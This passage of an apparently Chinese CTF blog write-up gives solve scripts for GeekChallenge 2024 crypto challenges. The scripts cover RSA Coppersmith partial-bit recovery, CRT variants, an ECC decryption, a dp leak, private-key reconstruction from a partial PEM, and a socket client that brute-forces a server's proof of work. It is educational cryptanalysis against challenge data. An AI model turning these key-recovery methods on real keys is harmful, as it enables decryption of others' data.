class="string">b&quot;SYC&#123;&quot;</span>)[:<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(xor(key, enc))</span><br></pre></td></tr></table></figure><h2 id="ncoCRT">ncoCRT</h2><p>gpt*2</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 p 和 c 数组</span></span><br><span class="line">p = [</span><br><span class="line">    <span class="number">1921232050179818686537976490035</span>,</span><br><span class="line">    <span class="number">2050175089402111328155892746480</span>,</span><br><span class="line">    <span class="number">1960810970476421389691930930824</span>,</span><br><span class="line">    <span class="number">1797713136323968089432024221276</span>,</span><br><span class="line">    <span class="number">2326915607951286191807212748022</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1259284928311091851012441581576</span>,</span><br><span class="line">    <span class="number">1501691203352712190922548476321</span>,</span><br><span class="line">    <span class="number">1660842626322200346728249202857</span>,</span><br><span class="line">    <span class="number">657314037433265072289232145909</span>,</span><br><span class="line">    <span class="number">2056630082529583499248887436721</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过中国剩余定理求解 m</span></span><br><span class="line">m, _ = crt(p, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 m 转换回字节</span></span><br><span class="line">m_bytes = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉最后 23 个字节</span></span><br><span class="line">flag = m_bytes[:-<span class="number">23</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ezRSA">ezRSA</h2><p>经典的m高位泄露，套脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">3</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(M)))</span><br><span class="line"></span><br><span class="line">h = <span class="number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span></span><br><span class="line">high_m=(h+<span class="number">2023</span>)//<span class="number">2024</span></span><br><span class="line">n = <span class="number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span></span><br><span class="line">c =<span class="number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span></span><br><span class="line"></span><br><span class="line">phase2(high_m, n, c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="凯撒加密">凯撒加密</h2><p><img src="/img/WP/GeekChallenge2024/caesar.png" alt=""></p><h2 id="nc">nc</h2><p>gpt*3</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Server details</span></span><br><span class="line">HOST = <span class="string">&quot;nc1.ctfplus.cn&quot;</span>  <span class="comment"># Replace with the server&#x27;s IP address</span></span><br><span class="line">PORT = <span class="number">17384</span>  <span class="comment"># Replace with the server&#x27;s port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_proof_of_work</span>(<span class="params">suffix, hexdigest</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Solve the Proof of Work challenge by brute-forcing the first 4 characters.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(suffix, hexdigest)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> (</span><br><span class="line">        <span class="string">&quot;&quot;</span>.join(c)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>)</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256((x + suffix).encode()).hexdigest() == hexdigest:</span><br><span class="line">            <span class="keyword">return</span> x.encode()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Connect to the server, solve the Proof of Work, and retrieve the flag.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read Proof of Work challenge</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse the PoW challenge</span></span><br><span class="line">        <span class="comment"># Example: &quot;[+] sha256(XXXX+abcdef) == deadbeef...&quot;</span></span><br><span class="line">        _, rest = data.split(<span class="string">&quot;sha256(XXXX+&quot;</span>)</span><br><span class="line">        proof, hexdigest = rest.split(<span class="string">&quot;) == &quot;</span>)</span><br><span class="line">        hexdigest = hexdigest.strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Solve the PoW</span></span><br><span class="line">        prefix = solve_proof_of_work(proof.strip(), hexdigest)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> prefix:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed to solve Proof of Work&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send the PoW solution</span></span><br><span class="line">        s.sendall(prefix + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read the server&#x27;s response</span></span><br><span class="line">        response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;PoW failed.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="comment"># Retrieve the flag characters</span></span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):  <span class="comment"># Assuming the flag length is 32</span></span><br><span class="line">            s.sendall(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">            response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(response)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;[+]&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">                flag += response.split(<span class="string">&quot;[+] &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid response:&quot;</span>, response)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Print the complete flag</span></span><br><span class="line">        flag = flag.replace(<span class="string">&quot;[-] &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure><h2 id="highlow">highlow</h2><p><a href="https://life-extension.github.io/2020/03/29/Coppersmith%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93/">https://life-extension.github.io/2020/03/29/Coppersmith攻击方式小结/</a><br>转成p已知高位和低位的攻击</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;z&#x27;</span>*<span class="number">44</span></span><br><span class="line">f = <span class="built_in">hex</span>(bytes_to_long(flag.encode()))</span><br><span class="line">pxor = <span class="number">124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span></span><br><span class="line"><span class="built_in">print</span>(f,<span class="built_in">len</span>(<span class="built_in">str</span>(f[<span class="number">2</span>:])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pxor),<span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(pxor))[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;high = &#x27;</span>,<span class="built_in">hex</span>(pxor &amp;<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;low = &#x27;</span>, <span class="built_in">hex</span>(pxor &amp;<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>))</span><br></pre></td></tr></table></figure><pre><code>high =  0xb0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3ea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000low =  0x496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</code></pre><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">size = <span class="number">2048</span></span><br><span class="line">sizep= <span class="number">1024</span></span><br><span class="line">knownbits= <span class="number">134</span>*<span class="number">4</span></span><br><span class="line">N = <span class="number">14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#we need to define an polynomial == 0 (mod p) that gives us the missing part (x)</span></span><br><span class="line"><span class="comment"># f_p(x) = x*2**(knownbits/2) + p_msb + p_lsb</span></span><br><span class="line"><span class="comment"># it&#x27;s not monic so we need to divide by 2**(knownbits/2)</span></span><br><span class="line"><span class="comment"># set R = 2**(knownbits/2) and invert it modulo N</span></span><br><span class="line"></span><br><span class="line">R = <span class="number">2</span>**(knownbits//<span class="number">2</span>)<span class="comment">#从第68位开始测试</span></span><br><span class="line">invR = inverse_mod(R,N)</span><br><span class="line"><span class="comment">#补齐两边</span></span><br><span class="line">p_msb = <span class="number">0xb0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3ea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">p_lsb = <span class="number">0x496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</span></span><br><span class="line"><span class="comment">#setup coppersmith</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line"><span class="comment">#define the poly in x modulo p</span></span><br><span class="line">f = x + (p_msb+p_lsb)*invR</span><br><span class="line"><span class="comment">#solve it</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^(sizep-knownbits)-<span class="number">1</span>, beta=<span class="number">0.44</span>, epsilon=<span class="number">1</span>/<span class="number">64</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;reconstructed p: &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(Integer(x0*R)+p_msb+p_lsb))</span><br><span class="line"><span class="comment"># reconstructed p: b0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3eaa21526dceb4b5a0150fccdddbc5e88b624e41e9270428bf188d2526ccadabff88ea107fcb6952e937b0d315d0496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</span></span><br></pre></td></tr></table></figure><h2 id="RnoCRT">RnoCRT</h2><p>风二西题库又秒了<br>[V&amp;N2020 公开赛]CRT(中国剩余定理模数不互质)<br><a href="https://blog.csdn.net/weixin_44110537/article/details/107396080">https://blog.csdn.net/weixin_44110537/article/details/107396080</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">a1, n1, a2, n2</span>):</span><br><span class="line">    d = math.gcd(n1, n2)</span><br><span class="line">    c = a2 - a1</span><br><span class="line">    <span class="keyword">if</span> c % d != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    c = (c % n2 + n2) % n2</span><br><span class="line">    c = c // d</span><br><span class="line">    n1 = n1 // d</span><br><span class="line">    n2 = n2 // d</span><br><span class="line">    c *= gmpy2.invert(n1, n2)</span><br><span class="line">    c %= n2</span><br><span class="line">    c *= n1 * d</span><br><span class="line">    c += a1</span><br><span class="line">    <span class="keyword">global</span> n3</span><br><span class="line">    <span class="keyword">global</span> a3</span><br><span class="line">    n3 = n1 * n2 * d</span><br><span class="line">    a3 = (c % n3 + n3) % n3</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT</span>(<span class="params">a, n</span>):</span><br><span class="line">    a1 = a[<span class="number">0</span>]</span><br><span class="line">    n1 = n[<span class="number">0</span>]</span><br><span class="line">    le = <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2 = n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1, n1, a2, n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">global</span> mod</span><br><span class="line">    mod = n1</span><br><span class="line">    <span class="keyword">return</span> (a1 % n1 + n1) % n1</span><br><span class="line"></span><br><span class="line">ms = [</span><br><span class="line">    <span class="number">207867980504656835313307696396607264603</span>,</span><br><span class="line">    <span class="number">245036212212570610987366430554968489325</span>,</span><br><span class="line">    <span class="number">270836744824069537438646110613439698666</span>,</span><br><span class="line">    <span class="number">319275775495422875474878625752594133023</span>,</span><br><span class="line">    <span class="number">254268823435329877199449670714528712873</span>,</span><br><span class="line">    <span class="number">213093607196415232366564484229844568444</span>,</span><br><span class="line">    <span class="number">246921085368773491003187313772615702950</span>,</span><br><span class="line">]</span><br><span class="line">cs = [</span><br><span class="line">    <span class="number">150031581047390726903711035932621949276</span>,</span><br><span class="line">    <span class="number">21260202376534810598778595491323328519</span>,</span><br><span class="line">    <span class="number">144049733622518360270048059408969512643</span>,</span><br><span class="line">    <span class="number">236920143187836025924037873968303507493</span>,</span><br><span class="line">    <span class="number">99781504248790469459151935530031893836</span>,</span><br><span class="line">    <span class="number">69236016568483424294966410179787943383</span>,</span><br><span class="line">    <span class="number">20613188366058016717435734248097940419</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">x = exCRT(cs, ms)</span><br><span class="line">flag = hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;6a651&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">    x = x + mod</span><br><span class="line">    <span class="comment"># print(x)</span></span><br><span class="line">    flag = hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(type(flag))</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ecc">ecc</h2><p><a href="https://dexterjie.github.io/2023/07/25/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/ECC/">https://dexterjie.github.io/2023/07/25/非对称加密/ECC/</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line">a = <span class="number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span></span><br><span class="line">b = <span class="number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line">k = <span class="number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E([<span class="number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span> , <span class="number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span>])</span><br><span class="line">c2 = E([<span class="number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span> , <span class="number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span>])</span><br><span class="line">cipher_left = <span class="number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span></span><br><span class="line">cipher_right = <span class="number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = c1 - k * c2</span><br><span class="line"></span><br><span class="line">flag1 = cipher_left//m[<span class="number">0</span>]</span><br><span class="line">flag2 = cipher_right//m[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag1,flag2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag1))+long_to_bytes(<span class="built_in">int</span>(flag2)))</span><br></pre></td></tr></table></figure><h2 id="dp">dp</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line">n = <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp = <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65537</span>):</span><br><span class="line">    p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = libnum.n2s(<span class="built_in">int</span>(m)).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="inPEM（复现）">inPEM（复现）</h2><p>给了公钥和私钥的部分，直接手撕，注意删掉私钥第一个w</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&quot;key.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="comment"># c = b64decode(c)</span></span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;public.pem&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f.read())</span><br><span class="line">    n = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;ZyyAzKowuDD1R48UelUskEv0W8AXLOHR4nni</span></span><br><span class="line"><span class="string">2uqP/7tlAPCJrMVD8zoRsRviyUnqO6y7cV7G0Fo1AoGBALpb6vOC9Ya/BEYV8+yL</span></span><br><span class="line"><span class="string">814K0KQc7LITkwqGrDWoDZAxmgWqVtoxHuhDWr5jF+ttFZBPx4fTezTEjarXXSt3</span></span><br><span class="line"><span class="string">pB1c7EwnzO0Hy9qJH++g2dcCUCO8uGXBbAACZqCQZAAydSrM5zozWAYMBWcj54j0</span></span><br><span class="line"><span class="string">LtyOEg4PWPXiTzJ//xxWaH+xAoGBAKFGRIyYD89JvlZA6oz7YnjzsnDlTq01td32</span></span><br><span class="line"><span class="string">XAuw62dZQHWmg1npC3YtzFlgTyNY2QelObmryyc2vFnxVhTYcDXFLQwrX8X5YV4A</span></span><br><span class="line"><span class="string">rFAAlyzxpNzYPzDHrdqLD6PhMU+wRuHVPyAtNBsL0N+mgQcsWJJvngSTHg86kJOl</span></span><br><span class="line"><span class="string">HlNuLBGhAoGAFiG3VR+lubcPvXOVAvkt+c8rF6qcmXlb2Og0hNwDJ2roX98aqOVy</span></span><br><span class="line"><span class="string">p5AWGPoA1siI4/RPIp1ClfEwKMjraun1ZJs/jKemaQk2hdhWkQ+6QinvUJbA1Lqm</span></span><br><span class="line"><span class="string">TcRmKa1emY/U6I8ce6N69e7ver1DV4I/ugSahJlZT/JRyF5qj1uVZ/k=&quot;&quot;&quot;</span></span><br><span class="line">tb = base64.b64decode(data)</span><br><span class="line"><span class="built_in">print</span>(tb.<span class="built_in">hex</span>())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a35</span></span><br><span class="line"><span class="string">028181</span></span><br><span class="line"><span class="string">00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1 # 即dp=d%(p-1)</span></span><br><span class="line"><span class="string">028181</span></span><br><span class="line"><span class="string">00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1 # 即dq=d%(q-1)</span></span><br><span class="line"><span class="string">028180</span></span><br><span class="line"><span class="string">1621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9 # 即cf=(inverse of q) mod p</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dp = <span class="number">0x00BA5BEAF382F586BF044615F3EC8BF35E0AD0A41CECB213930A86AC35A80D90319A05AA56DA311EE8435ABE6317EB6D15904FC787D37B34C48DAAD75D2B77A41D5CEC4C27CCED07CBDA891FEFA0D9D7025023BCB865C16C000266A090640032752ACCE73A3358060C056723E788F42EDC8E120E0F58F5E24F327FFF1C56687FB1</span></span><br><span class="line">dq = <span class="number">0x00A146448C980FCF49BE5640EA8CFB6278F3B270E54EAD35B5DDF65C0BB0EB67594075A68359E90B762DCC59604F2358D907A539B9ABCB2736BC59F15614D87035C52D0C2B5FC5F9615E00AC5000972CF1A4DCD83F30C7ADDA8B0FA3E1314FB046E1D53F202D341B0BD0DFA681072C58926F9E04931E0F3A9093A51E536E2C11A1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = libnum.gcd(<span class="built_in">pow</span>(<span class="number">6</span>, dq * e, n) - <span class="number">6</span>, n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(n == p * q)</span><br><span class="line">m = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = libnum.invmod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&quot;private1.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">private.write(myrsa.exportKey())</span><br><span class="line">private.close()</span><br><span class="line"><span class="comment"># openssl rsautl -decrypt -inkey private1.pem -in key.enc</span></span><br></pre></td></tr></table></figure><h2 id="Math（复现）">Math（复现）</h2><p>逆向出来的源码大概如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">input_str = <span class="string">&quot;&quot;</span></span><br><span class="line">m = <span class="built_in">int</span>(input_str, <span class="number">16</span>)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c =  0x639cd472630afb1aa9f5490b4f3de3b4701eef5c61aad06345f9e001021340cf989fc082693f745716bd39d015793e62be08913dcb82b2b6c8ed56d15a4cc230a60ea185d593a858b47276c403c79b6da23b561b200295a8addba7a48660d17a9eef322e430b939aecc4ca0c0f4fcc003524cdca68b7be935962f4b4ad8cafd5</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challenge1 求p</span></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">c1 = <span class="built_in">pow</span>(p, <span class="number">39847</span>, n1)</span><br><span class="line">aa = <span class="number">2023</span> * p1 + <span class="number">2024</span></span><br><span class="line">hint1 = <span class="built_in">pow</span>(aa, q1, n1)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n1 =  